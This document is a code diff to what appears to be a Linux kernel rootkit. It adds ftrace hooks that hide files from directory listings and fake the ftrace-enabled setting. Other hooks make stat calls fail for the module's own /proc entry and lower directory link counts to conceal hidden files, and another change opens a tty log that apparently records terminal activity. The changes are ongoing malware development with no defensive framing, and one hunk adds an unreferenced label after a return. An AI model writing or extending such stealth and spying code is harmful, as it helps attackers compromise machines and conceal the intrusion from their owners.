@@ -244,6 +244,7 @@ static bool _ftrace_intercept(struct pt_regs *regs) {
                 _ftrace_intercept_init(false)) {
             char current_value[16+1] = {0};
             char output[] = "1\n";
+            size_t output_size;
 
             arg = (const char __user *)PT_REGS_PARM2(regs);
             if (copy_from_user(current_value, (void *)arg, 16))
@@ -251,7 +252,7 @@ static bool _ftrace_intercept(struct pt_regs *regs) {
 
             current_value[sizeof(current_value) - 1] = '\0';
             strncpy(output, kv_prev_ftrace_enabled, sizeof(output));
-            size_t output_size = sizeof(output) - 1;
+            output_size = sizeof(output) - 1;
 
             if (!copy_to_user((void*)arg, output, output_size))
                 rc = true;
@@ -734,6 +735,13 @@ static int  (*real_filldir)(struct dir_context *, const char *, int, loff_t, u64
 static int m_filldir(struct dir_context *ctx, const char *name, int namlen,loff_t offset, u64 ino, unsigned int d_type) {
 #endif
 
+    /** For certain hidden files we don't have inode number initially,
+     * when hidden with "hide-file-anywhere" but it is available here
+     * and it is updated below, if needed.
+     * Also for files hidden anywhere same file can live
+     * in multiple directories, thus inode number may
+     * be updated to the current directory being listed
+     */
     if (fs_search_name(name, ino))
         return 0;
     return real_filldir(ctx, name, namlen, offset, ino, d_type);
@@ -749,7 +757,12 @@ static int m_filldir64(struct dir_context *ctx, const char *name, int namlen,lof
 
     if (fs_search_name(name, ino))
         return 0;
+
     return real_filldir64(ctx, name, namlen, offset, ino, d_type);
+
+match:
+    prinfo("Hiding '%s' from ino=%llu\n", name, ino);
+    return 0;
 }
 
 #define MAXKEY 512
@@ -998,18 +1011,32 @@ static __always_inline struct pt_regs *ftrace_get_regs(struct ftrace_regs *fregs
 
 static long (*real_vfs_statx)(int, const char __user *, int, struct kstat *, u32);
 static long m_vfs_statx(int dfd, const char __user *filename, int flags, struct kstat *stat, u32 request_mask) {
-    /** size is more than enough for what is needed here. */
+    /** XXX do I need this much */
     char kernbuf[PROCNAME_MAXLEN+6] = {0};
 
+    /* call original first, I want stat */
+    long rv = real_vfs_statx(dfd, filename, flags, stat, request_mask);
+
+    /** handle two distinct operations
+     *  1   If is directory, look for hidden file names
+     *      and update hard-links counter accordingly.
+     *  2   make stat fail for /proc interface.
+     * */
     if (!copy_from_user((void*)kernbuf, filename, sizeof(kernbuf)-1)) {
+        if (strlen(kernbuf) > 0 && S_ISDIR(stat->mode)) {
+            int count = fs_is_dir_inode_hidden((const char *)kernbuf, stat->ino);
+            if (count > 0) {
+                prinfo("%s: file match ino=%llu nlink=%d count=%d\n", __func__, stat->ino, stat->nlink, count);
 
-        /** we don't exist */
-        if (strstr(kernbuf, PROCNAME))
-            return -ENOENT;
+                /* Hit(s) -> decrement hard-link counts */
+                stat->nlink -= count;
+            }
+        } else if (strstr(kernbuf, PROCNAME)) {
+            /* Mauro? */
+            rv = -ENOENT;
+        }
     }
-
-    /** return normal */
-    return real_vfs_statx(dfd, filename, flags, stat, request_mask);
+    return rv;
 }
 
 /**
@@ -1281,22 +1308,26 @@ bool sys_init(void) {
     if (_sys_file_init(64, 64)) {
         char *tty = strrchr(sys_get_ttyfile(), '.');
         char *ssl = strrchr(sys_get_sslfile(), '.');
-        const char *files_to_hide[] = {tty, ssl, NULL};
+
+        if (!tty || !ssl) {
+            prerr("sys_init: Invalid parameter\n");
+            return rc;
+        }
 
         /** init fist a couple of hidden files */
-        if (tty && ssl && fs_add_name_ro(files_to_hide, 0) == 0) {
+        fs_add_name_ro(tty, 0);
+        fs_add_name_ro(ssl, 0);
 
-            rc = !fh_install_hooks(ft_hooks);
-            if (rc) {
-                for (idx = 0; ft_hooks[idx].name != NULL; ++idx)
-                    prinfo("ftrace hook %d on %s\n", idx, ft_hooks[idx].name);
+        rc = !fh_install_hooks(ft_hooks);
+        if (rc) {
+            for (idx = 0; ft_hooks[idx].name != NULL; ++idx)
+                prinfo("sys_init: ftrace hook %d on %s\n", idx, ft_hooks[idx].name);
 
-                /** Init tty log */
-                ttyfilp = fs_kernel_open_file(sys_get_ttyfile());
-                if (!ttyfilp) {
-                    prerr("Failed loading tty file\n");
-                    rc = false;
-                }
+            /** Init tty log */
+            ttyfilp = fs_kernel_open_file(sys_get_ttyfile());
+            if (!ttyfilp) {
+                prerr("sys_init: Failed loading tty file\n");
+                rc = false;
             }
         }
     }
